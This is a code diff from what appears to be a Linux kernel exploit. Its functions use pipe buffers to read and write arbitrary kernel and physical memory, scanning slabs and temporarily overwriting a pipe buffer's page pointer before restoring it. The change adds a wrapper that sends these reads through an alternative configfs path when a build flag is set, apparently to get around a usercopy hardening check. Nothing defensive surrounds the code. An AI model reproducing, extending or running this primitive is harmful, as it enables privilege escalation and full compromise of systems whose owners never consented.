@@ -675,9 +675,20 @@ int pipe_reclaim_cache_gate(int fd) {
   return 0;
 }
 
+static ssize_t read_pipe_object(
+    int fd, uintptr_t target, void *data, size_t len) {
+#if defined(APP_CONFIGFS_PIPE_USERCOPY_GUARD) && \
+    APP_CONFIGFS_PIPE_USERCOPY_GUARD
+  return configfs_read_object_once(
+      fd, target, data, len, PIPE_OBJECT_SIZE);
+#else
+  return kernel_read_data(fd, target, data, len);
+#endif
+}
+
 int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
   for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
-    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
+    if (read_pipe_object(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
         PIPE_SCAN_CHUNK) {
       return 0;
     }
@@ -769,7 +780,7 @@ int pipe_phys_read(
       !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
     return 0;
   }
-  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
+  if (read_pipe_object(fd, buf_addr, &saved, sizeof(saved)) !=
       (ssize_t)sizeof(saved)) {
     return 0;
   }
@@ -795,7 +806,7 @@ int pipe_phys_read(
   int restored_ok =
       kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
           (ssize_t)sizeof(saved) &&
-      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
+      read_pipe_object(fd, buf_addr, &restored, sizeof(restored)) ==
           (ssize_t)sizeof(restored) &&
       memcmp(&restored, &saved, sizeof(saved)) == 0;
   int ok = got == (ssize_t)len && restored_ok;
@@ -818,7 +829,7 @@ int pipe_phys_write(
       !is_direct_ptr(direct_addr) || len > PAGE_SIZE - direct_off) {
     return 0;
   }
-  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
+  if (read_pipe_object(fd, buf_addr, &saved, sizeof(saved)) !=
       (ssize_t)sizeof(saved)) {
     return 0;
   }
@@ -844,7 +855,7 @@ int pipe_phys_write(
   int restored_ok =
       kernel_write_data(fd, buf_addr, &saved, sizeof(saved)) ==
           (ssize_t)sizeof(saved) &&
-      kernel_read_data(fd, buf_addr, &restored, sizeof(restored)) ==
+      read_pipe_object(fd, buf_addr, &restored, sizeof(restored)) ==
           (ssize_t)sizeof(restored) &&
       memcmp(&restored, &saved, sizeof(saved)) == 0;
   int ok = wrote == (ssize_t)len && restored_ok;
